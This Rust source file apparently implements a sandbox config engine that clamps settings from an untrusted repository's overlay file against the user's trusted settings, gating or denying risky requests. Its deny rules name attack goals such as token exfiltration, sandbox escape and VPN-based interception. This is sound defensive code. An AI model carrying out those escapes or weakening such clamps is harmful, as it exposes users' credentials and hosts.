//! **Config trust-resolution engine** — the clamp that makes a repo-root
//! `.superzej.*` overlay *safe* to honour.
//!
//! superzej's config layers cascade most-specific-wins for *preferences*
//! (theme, keybinds, layout — a wrong value is a papercut). But a repo overlay
//! is checked into a repository the user may have **cloned from someone else**,
//! so for *constraints* (sandbox isolation, egress, credential exposure — a
//! wrong value is a breach or a code-exec-on-open) the trust gradient runs the
//! opposite way: the more-trusted level sets a bound and the less-trusted level
//! may only move **inward**.
//!
//! This module classifies every `[sandbox]` overlay field by merge semantics
//! and clamps the repo layer against the trusted base (global + profile [+ zone,
//! once zones land]). The output is a *sanctioned* overlay (only the granted
//! parts), a list of [`ClampEvent`] denials to surface, and a list of
//! [`GatedRequest`]s awaiting trust-on-first-use approval.
//!
//! Design notes:
//!   * Constraint semantics engage **only below the Profile level** — global,
//!     profile, env, and `--set` behave byte-for-byte as before, so there is no
//!     compatibility break in the trusted layers.
//!   * Three-valued list semantics apply at the Zone/Repo layers: `None` =
//!     inherit, `Some([])` = deny-all, `Some([..])` = narrow (intersect).
//!   * A repo overlay never *sets* a constraint; it *requests within* one. A
//!     weakening request is **denied and surfaced**, never silently applied and
//!     never turned into a consent dialog (that is reserved for gated additive
//!     requests like new mounts/scripts).
//!
//! The engine is pure and exhaustively unit-tested (the `hostile_repo_*` suite
//! is the security regression gate). Wiring into [`crate::config`] lives in
//! `Config::repo_sandbox` / `Config::resolve_env` (thin delegating wrappers).

use crate::config::{
    FileAccess, Network, OnMissing, SandboxConfig, SandboxLimits, SandboxOverlay, SandboxProfile,
    WarmDirenv,
};
use serde_json::json;
use std::collections::BTreeSet;

/// A layer in the trust ladder, most-trusted first. Constraint clamping engages
/// only for levels at or below [`TrustLevel::Zone`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum TrustLevel {
    /// Built-in defaults + inviolable invariants.
    Builtin,
    /// The user's `~/.config/superzej/config.toml`.
    UserGlobal,
    /// A profile overlay (also a process-level firewall).
    Profile,
    /// A zone overlay (a named group of workspaces inside a profile). Reserved
    /// slot — populated when zones land; the layer chain already carries it.
    Zone,
    /// A `[workspace.<slug>]` overlay (user-authored, in the global config).
    Workspace,
    /// A repo-root `.superzej.*` overlay — repo-authored, **least trusted**.
    Repo,
    /// `SUPERZEJ_*` env + `--set` CLI flags — user-typed at launch (trusted,
    /// but runtime rather than repo-authored, so they keep last-writer-wins).
    Runtime,
}

impl TrustLevel {
    fn label(self) -> &'static str {
        match self {
            TrustLevel::Builtin => "builtin",
            TrustLevel::UserGlobal => "global",
            TrustLevel::Profile => "profile",
            TrustLevel::Zone => "zone",
            TrustLevel::Workspace => "workspace",
            TrustLevel::Repo => "repo",
            TrustLevel::Runtime => "runtime",
        }
    }
}

/// How a config key merges across trust levels.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MergeClass {
    /// Preference — most-specific-wins cascade (today's behaviour).
    Override,
    /// Constraint — a more-trusted level sets the max reachable/spendable set;
    /// less-trusted levels may only intersect. Deny wins over allow.
    Ceiling,
    /// Constraint — a more-trusted level sets a minimum that can't be weakened.
    Floor,
    /// Union with gating — additions from less-trusted levels drag their
    /// egress/credential needs through trust-on-first-use.
    Accumulate,
}

/// What the *repo* layer may do with a given `[sandbox]` field.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RepoFieldRule {
    /// Preference — applied as-is.
    Allow,
    /// May only tighten along the field's restrictiveness lattice.
    Floor,
    /// May only narrow a list (three-valued; deny-all encoded as a `*` block).
    CeilingIntersect,
    /// Union; each added entry is trust-on-first-use gated.
    AccumulateGated,
    /// Whole-value request, trust-on-first-use gated.
    Gated,
    /// Never applied from the repo layer; the request is surfaced as a denial.
    Forbidden,
}

/// A clamp decision recorded for surfacing + `config explain`. `granted` equals
/// `requested` when fully granted, is a narrowed value when partially granted,
/// or is JSON `null` when denied outright.
#[derive(Debug, Clone, PartialEq)]
pub struct ClampEvent {
    pub layer: TrustLevel,
    pub key: String,
    pub rule: RepoFieldRule,
    pub requested: serde_json::Value,
    pub granted: serde_json::Value,
    pub reason: String,
}

impl ClampEvent {
    /// A denial (nothing granted).
    fn deny(
        layer: TrustLevel,
        key: &str,
        rule: RepoFieldRule,
        requested: serde_json::Value,
        reason: impl Into<String>,
    ) -> Self {
        ClampEvent {
            layer,
            key: key.to_string(),
            rule,
            requested,
            granted: serde_json::Value::Null,
            reason: reason.into(),
        }
    }
}

/// A trust-on-first-use-gated request from the repo layer, awaiting approval.
/// Its identity (for matching a stored approval) is the canonical JSON of
/// `{ "key": <key>, "value": <value> }`.
#[derive(Debug, Clone, PartialEq)]
pub struct GatedRequest {
    pub key: String,
    pub value: serde_json::Value,
    /// Human summary (e.g. `mount /etc:/etc:ro`) for the approval UI.
    pub summary: String,
}

impl GatedRequest {
    /// Canonical identity string — stable across whitespace/key-order so a
    /// stored approval matches a re-read overlay exactly. `serde_json` emits
    /// object keys in insertion order, so we build the object with a fixed
    /// shape.
    pub fn canonical(&self) -> String {
        // Values here are scalars/strings/arrays of strings, so their own
        // serialization is already canonical.
        format!(
            "{{\"key\":{},\"value\":{}}}",
            serde_json::to_string(&self.key).unwrap_or_default(),
            serde_json::to_string(&self.value).unwrap_or_default(),
        )
    }
}

/// The set of repo trust-on-first-use requests the user has already approved,
/// keyed by [`GatedRequest::canonical`].
#[derive(Debug, Clone, Default)]
pub struct Approvals {
    approved: BTreeSet<String>,
}

impl Approvals {
    /// Fail-closed: nothing approved. Every gated request stays pending.
    pub fn deny_all() -> Self {
        Approvals::default()
    }

    /// Build from a set of canonical request strings (the persisted approvals).
    pub fn from_canonical<I: IntoIterator<Item = String>>(items: I) -> Self {
        Approvals {
            approved: items.into_iter().collect(),
        }
    }

    /// Whether a gated request is covered by the approved canonical set.
    /// Matching is by [`GatedRequest::canonical`] string equality (see
    /// [`crate::repo_trust`]).
    pub fn is_approved(&self, req: &GatedRequest) -> bool {
        self.approved.contains(&req.canonical())
    }
}

// ---------------------------------------------------------------------------
// Restrictiveness lattices. Higher rank = stricter; a Floor field may only move
// to an equal-or-higher rank from the repo layer.
// ---------------------------------------------------------------------------

fn network_rank(n: Network) -> u8 {
    match n {
        Network::Host => 0,
        Network::Nat => 1,
        Network::None => 2,
    }
}

fn profile_rank(p: SandboxProfile) -> u8 {
    match p {
        SandboxProfile::Open => 0,
        SandboxProfile::Hardened => 1,
        SandboxProfile::SealedTunnel => 2,
        SandboxProfile::Sealed => 3,
    }
}

fn on_missing_rank(o: OnMissing) -> u8 {
    match o {
        OnMissing::Warn => 0,
        OnMissing::Prompt => 1,
        OnMissing::Fail => 2,
    }
}

fn warm_direnv_rank(w: WarmDirenv) -> u8 {
    match w {
        WarmDirenv::Auto => 0,
        WarmDirenv::AllowedOnly => 1,
        WarmDirenv::Off => 2,
    }
}

/// Partial order over `FileAccess`: more restrictive = greater. `Custom` is
/// incomparable to everything (a bespoke path set the trusted layer can't
/// bound), and `All`/`Host` are the widest — so a repo request for any of the
/// three is not a strict tightening and is denied. Returns `None` when the two
/// values are incomparable.
fn file_access_cmp(a: FileAccess, b: FileAccess) -> Option<std::cmp::Ordering> {
    use FileAccess::*;
    // Linear chain from widest to narrowest; Custom sits outside it.
    fn rank(f: FileAccess) -> Option<u8> {
        match f {
            Host => Some(0),
            All => Some(1),
            WorktreePlusCaches => Some(2),
            Worktree => Some(3),
            None => Some(4),
            Custom => Option::None,
        }
    }
    match (rank(a), rank(b)) {
        (Some(x), Some(y)) => Some(x.cmp(&y)),
        _ => Option::None,
    }
}

// ---------------------------------------------------------------------------
// Byte-size parsing for the `limits` ceiling (memory/cpu). Best-effort: an
// unparseable value is treated as "cannot verify" → denied.
// ---------------------------------------------------------------------------

/// Parse a memory string like `512m`, `2g`, `1024`, `1.5G` into bytes.
fn parse_bytes(s: &str) -> Option<u64> {
    let s = s.trim();
    if s.is_empty() {
        return None;
    }
    let (num, mult) = match s.chars().last().unwrap().to_ascii_lowercase() {
        'k' => (&s[..s.len() - 1], 1024u64),
        'm' => (&s[..s.len() - 1], 1024 * 1024),
        'g' => (&s[..s.len() - 1], 1024 * 1024 * 1024),
        't' => (&s[..s.len() - 1], 1024u64 * 1024 * 1024 * 1024),
        'b' => (&s[..s.len() - 1], 1),
        c if c.is_ascii_digit() => (s, 1),
        _ => return None,
    };
    num.trim()
        .parse::<f64>()
        .ok()
        .map(|v| (v * mult as f64) as u64)
}

/// Parse a cpu quota like `2`, `1.5`, `500m` (millicores) into millicores.
fn parse_cpu_millis(s: &str) -> Option<u64> {
    let s = s.trim();
    if let Some(m) = s.strip_suffix('m') {
        return m.trim().parse::<u64>().ok();
    }
    s.parse::<f64>().ok().map(|v| (v * 1000.0) as u64)
}

// ---------------------------------------------------------------------------
// Three-valued glob-list intersection (CeilingIntersect for network_allow).
// ---------------------------------------------------------------------------

/// A repo `network_allow` entry is granted iff a trusted pattern *covers* it
/// (so the effective list is provably never wider than the trusted list). An
/// empty trusted list means "universe" — everything is covered, so repo entries
/// pass through (a pure narrowing from allow-all to allow-only-these).
fn allow_entry_covered(entry: &str, trusted: &[String]) -> bool {
    if trusted.is_empty() {
        return true;
    }
    trusted
        .iter()
        .any(|t| t == entry || crate::dns_filter::name_matches(entry, t))
}

// ---------------------------------------------------------------------------
// The classification engine.
// ---------------------------------------------------------------------------

/// The result of clamping a repo overlay against a trusted base.
pub struct ClassifiedRepoOverlay {
    /// Only the *granted* parts of the repo request — safe to `apply()` onto
    /// the trusted base.
    pub sanctioned: SandboxOverlay,
    /// Denials + narrowings to surface (never silent).
    pub events: Vec<ClampEvent>,
    /// Gated additive requests awaiting trust-on-first-use approval.
    pub pending: Vec<GatedRequest>,
}

/// Classify a repo-root `[sandbox]` overlay against the trusted base (global +
/// profile [+ zone]). Fields the repo may not touch are dropped with a denial;
/// constraints may only tighten/narrow; additive requests (mounts, scripts,
/// image, ports, gpu, nix_daemon) are gated behind `approvals`.
///
/// The `SandboxOverlay` is destructured exhaustively (no `..`) so a new field
/// fails to compile until it is classified here.
pub fn classify_repo_overlay(
    req: SandboxOverlay,
    base: &SandboxConfig,
    approvals: &Approvals,
) -> ClassifiedRepoOverlay {
    let layer = TrustLevel::Repo;
    let mut out = SandboxOverlay::default();
    let mut events: Vec<ClampEvent> = Vec::new();
    let mut pending: Vec<GatedRequest> = Vec::new();

    let SandboxOverlay {
        enabled,
        backend,
        default_backend,
        default_env,
        backend_chain,
        image,
        profile,
        agent_profile,
        network,
        file_access,
        ports,
        gpu,
        limits,
        volumes,
        compose,
        env_passthrough,
        auto_caches,
        mounts,
        init_script,
        prepare,
        warm_direnv,
        devenv,
        inject_devshell,
        nix_daemon,
        shell,
        on_missing,
        remote,
        network_allow,
        network_block,
        network_audit,
        vpn,
        home,
    } = req;

    // --- Forbidden: never applied from the repo layer. --------------------
    macro_rules! forbid {
        ($opt:expr, $key:expr, $reason:expr) => {
            if let Some(v) = $opt {
                events.push(ClampEvent::deny(
                    layer,
                    $key,
                    RepoFieldRule::Forbidden,
                    json!(format!("{v:?}")),
                    $reason,
                ));
            }
        };
    }
    forbid!(
        backend,
        "sandbox.backend",
        "a repo may not choose the sandbox backend (backend=none/host is a full escape); set it in [workspace.<slug>] or a global [env]"
    );
    forbid!(
        default_backend,
        "sandbox.default_backend",
        "a repo may not choose the sandbox backend; set it in [workspace.<slug>] or a global [env]"
    );
    forbid!(
        backend_chain,
        "sandbox.backend_chain",
        "a repo may not reorder the backend fallback chain"
    );
    forbid!(
        default_env,
        "sandbox.default_env",
        "a repo selects an env via the top-level `env = \"…\"` key, not [sandbox] default_env"
    );
    forbid!(
        compose,
        "sandbox.compose",
        "a repo may not supply a compose file (arbitrary containers + host mounts)"
    );
    forbid!(
        env_passthrough,
        "sandbox.env_passthrough",
        "a repo may not widen host-env passthrough (token exfiltration); set it in [workspace.<slug>]"
    );
    forbid!(
        remote,
        "sandbox.remote",
        "a repo may not redirect execution to a remote host"
    );
    forbid!(
        vpn,
        "sandbox.vpn",
        "a repo may not attach a VPN/tunnel (egress redirection = MITM)"
    );
    forbid!(
        home,
        "sandbox.home",
        "a repo may not set the personal HOME layer (its setup_script runs during provisioning)"
    );

    // --- Floor: repo may only tighten along the lattice. ------------------
    // enabled: true-only (may enable the sandbox, never disable it).
    if let Some(v) = enabled {
        if v {
            out.enabled = Some(true);
        } else {
            events.push(ClampEvent::deny(
                layer,
                "sandbox.enabled",
                RepoFieldRule::Floor,
                json!(false),
                "a repo may not disable the sandbox; set `enabled = false` in [workspace.<slug>] or a global [env] if you trust this repo",
            ));
        }
    }
    floor_enum(
        &mut out.profile,
        &mut events,
        profile,
        base.profile,
        "sandbox.profile",
        profile_rank,
        |p| p.as_str().to_string(),
    );
    floor_enum(
        &mut out.agent_profile,
        &mut events,
        agent_profile,
        base.agent_profile,
        "sandbox.agent_profile",
        profile_rank,
        |p| p.as_str().to_string(),
    );
    floor_enum(
        &mut out.network,
        &mut events,
        network,
        base.network,
        "sandbox.network",
        network_rank,
        |n| n.as_str().to_string(),
    );
    floor_enum(
        &mut out.on_missing,
        &mut events,
        on_missing,
        base.on_missing,
        "sandbox.on_missing",
        on_missing_rank,
        |o| o.as_str().to_string(),
    );
    floor_enum(
        &mut out.warm_direnv,
        &mut events,
        warm_direnv,
        base.warm_direnv,
        "sandbox.warm_direnv",
        warm_direnv_rank,
        |w| w.as_str().to_string(),
    );
    // file_access: partial order; only a strict tightening to a comparable
    // value is granted (Custom/All/Host are denied).
    if let Some(v) = file_access {
        match file_access_cmp(v, base.file_access) {
            Some(std::cmp::Ordering::Greater) | Some(std::cmp::Ordering::Equal) => {
                out.file_access = Some(v);
            }
            _ => {
                events.push(ClampEvent::deny(
                    layer,
                    "sandbox.file_access",
                    RepoFieldRule::Floor,
                    json!(format!("{v:?}")),
                    "a repo may only tighten file access; this value would widen it (or is a bespoke set the trusted layer can't bound)",
                ));
            }
        }
    }
    // auto_caches: false is stricter (fewer host caches exposed).
    if let Some(v) = auto_caches {
        if !v {
            out.auto_caches = Some(false);
        } else {
            events.push(ClampEvent::deny(
                layer,
                "sandbox.auto_caches",
                RepoFieldRule::Floor,
                json!(true),
                "a repo may not enable host build-cache mounts",
            ));
        }
    }
    // network_audit: true is stricter (more logging).
    if let Some(v) = network_audit {
        if v {
            out.network_audit = Some(true);
        } else {
            events.push(ClampEvent::deny(
                layer,
                "sandbox.network_audit",
                RepoFieldRule::Floor,
                json!(false),
                "a repo may not disable network audit logging",
            ));
        }
    }

    // --- CeilingIntersect: network_allow (three-valued). ------------------
    // Also emits the deny-all `*` block below via `extra_block`.
    let mut extra_block: Vec<String> = Vec::new();
    match network_allow {
        None => {} // inherit the trusted ceiling
        Some(list) if list.is_empty() => {
            // Deny-all egress: encode as a universal DNS block.
            extra_block.push("*".to_string());
            events.push(ClampEvent {
                layer,
                key: "sandbox.network_allow".to_string(),
                rule: RepoFieldRule::CeilingIntersect,
                requested: json!([]),
                granted: json!("deny-all (network_block += \"*\")"),
                reason: "empty repo allow list ⇒ deny all egress".to_string(),
            });
        }
        Some(list) => {
            let mut granted = Vec::new();
            for entry in list {
                if allow_entry_covered(&entry, &base.network_allow) {
                    granted.push(entry);
                } else {
                    events.push(ClampEvent::deny(
                        layer,
                        "sandbox.network_allow",
                        RepoFieldRule::CeilingIntersect,
                        json!(entry),
                        format!(
                            "egress to {entry:?} is not within the trusted allow list; requests can only narrow it"
                        ),
                    ));
                }
            }
            // Setting the (narrowed) allow list replaces the base list, which is
            // correct: the granted set is the intersection.
            out.network_allow = Some(granted);
        }
    }

    // --- Accumulate (ungated): network_block. Deny always wins. -----------
    if network_block.is_some() || !extra_block.is_empty() {
        let mut union: Vec<String> = base.network_block.clone();
        if let Some(list) = network_block {
            for b in list {
                if !union.contains(&b) {
                    union.push(b);
                }
            }
        }
        for b in extra_block {
            if !union.contains(&b) {
                union.push(b);
            }
        }
        out.network_block = Some(union);
    }

    // --- limits: CeilingIntersect (granted iff ≤ trusted, or trusted unset).
    if let Some(req_limits) = limits {
        out.limits = Some(clamp_limits(&req_limits, &base.limits, &mut events, layer));
    }

    // --- AccumulateGated / Gated: trust-on-first-use. ---------------------
    // mounts (accumulate: union base + approved entries).
    if let Some(list) = mounts {
        let mut union = base.mounts.clone();
        for m in list {
            let gr = GatedRequest {
                key: "sandbox.mounts".to_string(),
                value: json!(m),
                summary: format!("mount {m}"),
            };
            if approvals.is_approved(&gr) {
                if !union.contains(&m) {
                    union.push(m);
                }
            } else {
                pending.push(gr);
            }
        }
        out.mounts = Some(union);
    }
    // volumes (accumulate map; each entry gated).
    if let Some(map) = volumes {
        let mut union = base.volumes.clone();
        for (k, v) in map {
            let gr = GatedRequest {
                key: "sandbox.volumes".to_string(),
                value: json!({ "host": k, "dest": v }),
                summary: format!("volume {k} -> {v}"),
            };
            if approvals.is_approved(&gr) {
                union.insert(k, v);
            } else {
                pending.push(gr);
            }
        }
        out.volumes = Some(union);
    }
    gated_scalar_string(
        &mut out.init_script,
        &mut pending,
        init_script,
        "sandbox.init_script",
        approvals,
        |s| format!("run init_script ({} chars)", s.len()),
    );
    if let Some(list) = prepare {
        let mut granted = Vec::new();
        for cmd in list {
            let gr = GatedRequest {
                key: "sandbox.prepare".to_string(),
                value: json!(cmd),
                summary: format!("prepare: {cmd}"),
            };
            if approvals.is_approved(&gr) {
                granted.push(cmd);
            } else {
                pending.push(gr);
            }
        }
        if !granted.is_empty() {
            out.prepare = Some(granted);
        }
    }
    gated_scalar_string(
        &mut out.image,
        &mut pending,
        image,
        "sandbox.image",
        approvals,
        |s| format!("use image {s}"),
    );
    gated_scalar_string(
        &mut out.gpu,
        &mut pending,
        gpu,
        "sandbox.gpu",
        approvals,
        |s| format!("gpu passthrough {s}"),
    );
    if let Some(list) = ports {
        let mut granted = Vec::new();
        for p in list {
            let gr = GatedRequest {
                key: "sandbox.ports".to_string(),
                value: json!(p),
                summary: format!("publish port {p}"),
            };
            if approvals.is_approved(&gr) {
                granted.push(p);
            } else {
                pending.push(gr);
            }
        }
        if !granted.is_empty() {
            out.ports = Some(granted);
        }
    }
    if let Some(v) = nix_daemon {
        let gr = GatedRequest {
            key: "sandbox.nix_daemon".to_string(),
            value: json!(v),
            summary: format!("nix_daemon = {v}"),
        };
        if approvals.is_approved(&gr) {
            out.nix_daemon = Some(v);
        } else if v {
            pending.push(gr);
        } else {
            // Requesting to *disable* the daemon socket is a tightening → allow.
            out.nix_daemon = Some(false);
        }
    }

    // --- Allow: in-sandbox preferences, inside the trust boundary. --------
    out.devenv = devenv;
    out.inject_devshell = inject_devshell;
    out.shell = shell;

    ClassifiedRepoOverlay {
        sanctioned: out,
        events,
        pending,
    }
}

/// Floor helper for a `config_enum!` value: grant iff the request is an
/// equal-or-stricter rank than the base.
#[allow(clippy::too_many_arguments)]
fn floor_enum<T: Copy>(
    slot: &mut Option<T>,
    events: &mut Vec<ClampEvent>,
    req: Option<T>,
    base: T,
    key: &str,
    rank: fn(T) -> u8,
    show: fn(T) -> String,
) {
    if let Some(v) = req {
        if rank(v) >= rank(base) {
            *slot = Some(v);
        } else {
            events.push(ClampEvent::deny(
                TrustLevel::Repo,
                key,
                RepoFieldRule::Floor,
                json!(show(v)),
                format!(
                    "a repo may only tighten {key}; {} is weaker than the trusted {}",
                    show(v),
                    show(base)
                ),
            ));
        }
    }
}

/// Gated string scalar: grant iff approved, else record a pending request.
fn gated_scalar_string(
    slot: &mut Option<String>,
    pending: &mut Vec<GatedRequest>,
    req: Option<String>,
    key: &str,
    approvals: &Approvals,
    summary: fn(&str) -> String,
) {
    if let Some(s) = req {
        if s.is_empty() {
            return;
        }
        let gr = GatedRequest {
            key: key.to_string(),
            value: json!(s),
            summary: summary(&s),
        };
        if approvals.is_approved(&gr) {
            *slot = Some(s);
        } else {
            pending.push(gr);
        }
    }
}

/// Clamp requested `limits` to the trusted ceiling: each of cpu/memory is
/// granted iff ≤ the trusted value (or the trusted value is unset). Unparseable
/// requests are denied.
fn clamp_limits(
    req: &SandboxLimits,
    base: &SandboxLimits,
    events: &mut Vec<ClampEvent>,
    layer: TrustLevel,
) -> SandboxLimits {
    let mut out = base.clone();
    if let Some(ref mem) = req.memory {
        match (
            parse_bytes(mem),
            base.memory.as_deref().and_then(parse_bytes),
        ) {
            (Some(r), Some(b)) if r <= b => out.memory = Some(mem.clone()),
            (Some(r), None) => {
                let _ = r;
                out.memory = Some(mem.clone());
            }
            (Some(_), Some(_)) => events.push(ClampEvent::deny(
                layer,
                "sandbox.limits.memory",
                RepoFieldRule::CeilingIntersect,
                json!(mem),
                "requested memory limit exceeds the trusted ceiling",
            )),
            (None, _) => events.push(ClampEvent::deny(
                layer,
                "sandbox.limits.memory",
                RepoFieldRule::CeilingIntersect,
                json!(mem),
                "unparseable memory limit",
            )),
        }
    }
    if let Some(ref cpu) = req.cpu {
        match (
            parse_cpu_millis(cpu),
            base.cpu.as_deref().and_then(parse_cpu_millis),
        ) {
            (Some(r), Some(b)) if r <= b => out.cpu = Some(cpu.clone()),
            (Some(_), None) => out.cpu = Some(cpu.clone()),
            (Some(_), Some(_)) => events.push(ClampEvent::deny(
                layer,
                "sandbox.limits.cpu",
                RepoFieldRule::CeilingIntersect,
                json!(cpu),
                "requested cpu limit exceeds the trusted ceiling",
            )),
            (None, _) => events.push(ClampEvent::deny(
                layer,
                "sandbox.limits.cpu",
                RepoFieldRule::CeilingIntersect,
                json!(cpu),
                "unparseable cpu limit",
            )),
        }
    }
    out
}

/// Render a slice of clamp events into human lines (for `model.status` /
/// notifications). Grouped one per line, most-severe (denials) first.
pub fn summarize_events(events: &[ClampEvent]) -> Vec<String> {
    events
        .iter()
        .map(|e| {
            if e.granted.is_null() {
                format!("[{}] denied {}: {}", e.layer.label(), e.key, e.reason)
            } else {
                format!("[{}] {}: {}", e.layer.label(), e.key, e.reason)
            }
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Orchestration: assemble the trusted base, clamp the repo layer, extend
// workspace mounts. These carry the bodies that used to live in
// `Config::repo_sandbox` / `Config::resolve_env` (which are now thin wrappers).
// ---------------------------------------------------------------------------

use crate::config::Config;
use crate::env::Environment;
use crate::remote::GitLoc;
use std::path::Path;

/// A fully-resolved repo sandbox plus the clamp outcome for surfacing.
pub struct ResolvedRepoSandbox {
    /// The effective sandbox config (global + profile [+ zone] + clamped repo +
    /// workspace mounts, tilde-expanded).
    pub sandbox: SandboxConfig,
    /// Repo-overlay denials + narrowings to surface (never silent).
    pub events: Vec<ClampEvent>,
    /// Gated additive requests awaiting trust-on-first-use approval.
    pub pending: Vec<GatedRequest>,
}

/// Build the effective sandbox for a repo: global `[sandbox]` → profile overlay
/// (trusted, unclamped) → **clamped** repo overlay → workspace-mount extension →
/// tilde expansion. The `TrustLevel::Zone` slot sits between the profile overlay
/// and the repo clamp — zones plug in there (Phase 4).
pub fn resolve_repo_sandbox(
    cfg: &Config,
    repo_root: &Path,
    approvals: &Approvals,
) -> ResolvedRepoSandbox {
    let mut sb = cfg.sandbox.clone();
    // Profile sandbox overlay (per-profile network/isolation policy) — trusted.
    if let Some(profile) = cfg.active_profile() {
        profile.sandbox.clone().apply(&mut sb);
    }

    // --- Zone ceiling slot (Phase 4): `zone::apply_zone_ceilings(&mut sb, …)`
    //     clamps here, between the profile overlay and the repo layer. ---

    // Clamp the least-trusted repo overlay against the trusted base.
    let mut events = Vec::new();
    let mut pending = Vec::new();
    if let Some(overlay) = crate::config::load_repo_overlay(repo_root) {
        let c = classify_repo_overlay(overlay.sandbox, &sb, approvals);
        c.sanctioned.apply(&mut sb);
        events = c.events;
        pending = c.pending;
    }

    // Per-workspace bind dirs ([workspace.<slug>] sandbox_mounts) extend the
    // global/profile/repo mounts. Workspace config is user-authored (more
    // trusted than the repo), so this is an ungated accumulate.
    if !cfg.workspace.is_empty() {
        let base = crate::util::slugify(&crate::repo::repo_name(repo_root));
        let slug = if base.is_empty() {
            "repo".to_string()
        } else {
            base
        };
        if let Some(ws) = cfg.workspace.get(&slug) {
            sb.mounts.extend(ws.sandbox_mounts.iter().cloned());
        }
    }
    sb.mounts = sb
        .mounts
        .iter()
        .map(|m| match m.split_once(':') {
            Some((host, opt)) => format!("{}:{opt}", crate::util::expand_tilde(host)),
            None => crate::util::expand_tilde(m),
        })
        .collect();
    // NB: remote.remote_dir is a *remote* path — expanded on the remote host.

    ResolvedRepoSandbox {
        sandbox: sb,
        events,
        pending,
    }
}

/// Resolve the full execution [`Environment`], honouring `approvals`. Env-name
/// precedence (most specific wins): `selected` → repo `.superzej.*` `env =` →
/// global `[sandbox] default_env` → implicit `"default"`. The named-env overlay
/// is trusted (globally defined) and applies unclamped on top of the clamped
/// repo base.
pub fn resolve_environment(
    cfg: &Config,
    repo_root: &Path,
    loc: &GitLoc,
    worktree: &Path,
    selected: Option<&str>,
    approvals: &Approvals,
) -> (Environment, ResolvedRepoSandbox) {
    let resolved = resolve_repo_sandbox(cfg, repo_root, approvals);
    let base = resolved.sandbox.clone();
    let pick = |s: &str| {
        let t = s.trim();
        (!t.is_empty()).then(|| t.to_string())
    };
    let name = selected
        .and_then(pick)
        .or_else(|| pick(&cfg.repo_env_name(repo_root)))
        .or_else(|| pick(&base.default_env))
        .unwrap_or_else(|| "default".to_string());

    let env = match cfg.env.get(&name) {
        None => {
            // Implicit default env, or a typo'd selection: today's behavior.
            if name != "default" {
                crate::config::config_warn(&format!(
                    "execution environment {name:?} is not defined under [env.{name}]; using the default"
                ));
            }
            let data = crate::config::data_mode_from_remote(base.remote.mode);
            Environment {
                name: "default".into(),
                placement: crate::sandbox::placement_from_loc(&base, loc),
                sandbox: base,
                data,
            }
        }
        Some(envc) => {
            let mut sb = base;
            envc.sandbox.clone().apply(&mut sb);
            let mut placement =
                crate::envbuild::build_env_placement(envc, &sb, loc, worktree, repo_root);
            // A host-pinned ssh env (`[env.*] host = "name"`) reaches the box
            // exactly as the control plane does — via the `[host.*.ssh]` config
            // (transport, ProxyCommand, identity, …). Without this the pane is
            // built from the env's own (usually empty) ssh table, defaulting to
            // mosh with no ProxyCommand — which dies "mosh failed" on a host
            // that has no mosh. Pin the pane to the host's placement.
            if matches!(envc.placement, crate::config::PlacementMode::Ssh)
                && !envc.host.trim().is_empty()
                && let Some(binding) = cfg.resolve_host_binding(&name, envc)
                && let crate::host::Reach::Ssh(p) = binding.reach
            {
                placement = crate::placement::Placement::Ssh(p);
            }
            Environment {
                name,
                placement,
                sandbox: sb,
                data: envc.data,
            }
        }
    };
    (env, resolved)
}

// ---------------------------------------------------------------------------
// `config explain <key>` — provenance by cold-path layer replay. Snapshot the
// config after each layer, diff at the dotted key, report the origin. Uniform
// across typed overlays, profile deep-merge, env, and `--set`; zero hot-path
// cost (this runs only for the CLI).
// ---------------------------------------------------------------------------

use crate::config::EnvSource;

/// The provenance of one config key.
pub struct KeyOrigin {
    pub key: String,
    /// Effective value (JSON), or `null` if the key path doesn't resolve.
    pub value: serde_json::Value,
    /// The most-specific layer that set the effective value.
    pub origin: TrustLevel,
    /// The value at each layer (label, json) for a full trace.
    pub trace: Vec<(TrustLevel, serde_json::Value)>,
}

/// Turn a dotted key (`sandbox.network_allow`) into a JSON pointer
/// (`/sandbox/network_allow`).
fn dotted_to_pointer(key: &str) -> String {
    let mut p = String::new();
    for seg in key.split('.') {
        p.push('/');
        p.push_str(&seg.replace('~', "~0").replace('/', "~1"));
    }
    p
}

fn at(cfg: &Config, ptr: &str) -> serde_json::Value {
    serde_json::to_value(cfg)
        .ok()
        .and_then(|v| v.pointer(ptr).cloned())
        .unwrap_or(serde_json::Value::Null)
}

/// Explain how `key` resolves through the config layers (defaults → file →
/// profile → env → `--set`). The Zone/Workspace/Repo layers are constraint
/// layers handled by the clamp trace (see [`resolve_repo_sandbox`]), not this
/// preference cascade.
pub fn explain(
    env: &dyn EnvSource,
    cli_overrides: &[String],
    path: Option<std::path::PathBuf>,
    key: &str,
) -> KeyOrigin {
    let ptr = dotted_to_pointer(key);

    // L0: built-in defaults.
    let defaults = Config::default();
    // L1: file (serde fills defaults, so this is defaults+file).
    let file = path.unwrap_or_else(Config::path);
    let s = std::fs::read_to_string(&file).unwrap_or_default();
    let file_cfg: Config = toml::from_str(&s).unwrap_or_default();
    // L2: + profile overlay.
    let mut profile_cfg = file_cfg.clone();
    if let Some(pfile) = Config::profile_overlay_path(env)
        && let Ok(ps) = std::fs::read_to_string(&pfile)
    {
        let _ = Config::apply_toml_overlay(&mut profile_cfg, &ps);
    }
    // L3: + env.
    let mut env_cfg = profile_cfg.clone();
    crate::config::env_overlay(env).apply(&mut env_cfg);
    // L4: + `--set`, then post-process (the effective config).
    let mut flag_cfg = env_cfg.clone();
    for ov in cli_overrides {
        if let Some((k, v)) = ov.split_once('=') {
            let _ = Config::apply_override_str(&mut flag_cfg, k, v);
        }
    }
    flag_cfg.post_process();

    let stages = [
        (TrustLevel::Builtin, at(&defaults, &ptr)),
        (TrustLevel::UserGlobal, at(&file_cfg, &ptr)),
        (TrustLevel::Profile, at(&profile_cfg, &ptr)),
        (TrustLevel::Runtime, at(&env_cfg, &ptr)),
        (TrustLevel::Runtime, at(&flag_cfg, &ptr)),
    ];
    // Origin = the last stage whose value differs from the previous stage.
    let mut origin = TrustLevel::Builtin;
    for i in 1..stages.len() {
        if stages[i].1 != stages[i - 1].1 {
            origin = stages[i].0;
        }
    }
    let value = at(&flag_cfg, &ptr);
    KeyOrigin {
        key: key.to_string(),
        value,
        origin,
        trace: stages.to_vec(),
    }
}

impl TrustLevel {
    /// Human label (public for renderers).
    pub fn as_str(self) -> &'static str {
        self.label()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SandboxConfig;

